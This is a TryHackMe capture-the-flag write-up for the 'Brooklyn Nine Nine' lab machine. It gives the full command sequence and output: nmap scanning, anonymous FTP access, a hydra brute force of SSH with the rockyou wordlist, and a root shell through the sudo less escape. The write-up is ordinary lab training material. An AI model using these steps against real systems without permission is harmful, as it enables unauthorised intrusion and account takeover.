---
title: Brooklyn Nine Nine
categories: [writeups,TryHackMe]
tags: [b2r,Linux,Privilege-Escalation,SSH]
---
# Brooklyn Nine Nine
- Difficulty : `Easy`
- Operating System : `Linux`

# Table of Content
- [Brooklyn Nine Nine](#brooklyn-nine-nine)
- [Table of Content](#table-of-content)
- [Nmap Result](#nmap-result)
- [Method to solve the challenge](#method-to-solve-the-challenge)
- [Privilege Escalation](#privilege-escalation)

# Nmap Result
```
Nmap scan report for 10.10.14.0
Host is up, received syn-ack (0.36s latency).
Scanned at 2022-07-28 07:24:22 UTC for 20s

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.6.105.254
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQjh/Ae6uYU+t7FWTpPoux5Pjv9zvlOLEMlU36hmSn4vD2pYTeHDbzv7ww75UaUzPtsC8kM1EPbMQn1BUCvTNkIxQ34zmw5FatZWNR8/De/u/9fXzHh4MFg74S3K3uQzZaY7XBaDgmU6W0KEmLtKQPcueUomeYkqpL78o5+NjrGO3HwqAH2ED1Zadm5YFEvA0STasLrs7i+qn1G9o4ZHhWi8SJXlIJ6f6O1ea/VqyRJZG1KgbxQFU+zYlIddXpub93zdyMEpwaSIP2P7UTwYR26WI2cqF5r4PQfjAMGkG1mMsOi6v7xCrq/5RlF9ZVJ9nwq349ngG/KTkHtcOJnvXz
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBItJ0sW5hVmiYQ8U3mXta5DX2zOeGJ6WTop8FCSbN1UIeV/9jhAQIiVENAW41IfiBYNj8Bm+WcSDKLaE8PipqPI=
|   256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP2hV8Nm+RfR/f2KZ0Ub/OcSrqfY1g4qwsz16zhXIpqk
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

# Method to solve the challenge
In this challenge, we will start with port 21 as the nmap result shows that anonymous login is available and there is a text file in it.
```
ftp 10.10.14.0
Connected to 10.10.14.0.
220 (vsFTPd 3.0.3)
Name (10.10.14.0:root): Anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||41158|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.

from host: 
cat note_to_jake.txt
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine

```
From the given text, we know that user Jake has a weak password and we could make use of this information by brute force into any available services which need us to login such as SSH.
```
hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.10.14.0
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-28 03:50:00
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.14.0:22/
[22][ssh] host: 10.10.14.0   login: jake   password: 987654321
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-07-28 03:50:45
```
Since we have the credentials, we are able to get a shell via ssh. The shell does not have root privilege and we will need to perform privilege escalation.
```
ssh 10.10.14.0 -l jake
jake@10.10.14.0's password: 
Last login: Thu Jul 28 07:40:53 2022 from 10.6.105.254
jake@brookly_nine_nine:~$
```
# Privilege Escalation
As for privilege escalation, we always start with the most easy method which is checking for user privilege or SUID binary which could give us root privilege. Linpeas.sh is also a option but try not to perform as automated is not good.
```
jake@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less

```
Based on the user privilege, user jake which is our current shell user is able to run `/usr/bin/less` with root privilege. This is wonderful as based on [GTFOBIN](https://gtfobins.github.io/gtfobins/less/), we are able to get shell with less command and maintaining privileged access.
```
jake@brookly_nine_nine:~$ sudo less /etc/passwd

in less :
!$SHELL

root@brookly_nine_nine:~# id
uid=0(root) gid=0(root) groups=0(root)

```
That is how we got our root privilege.


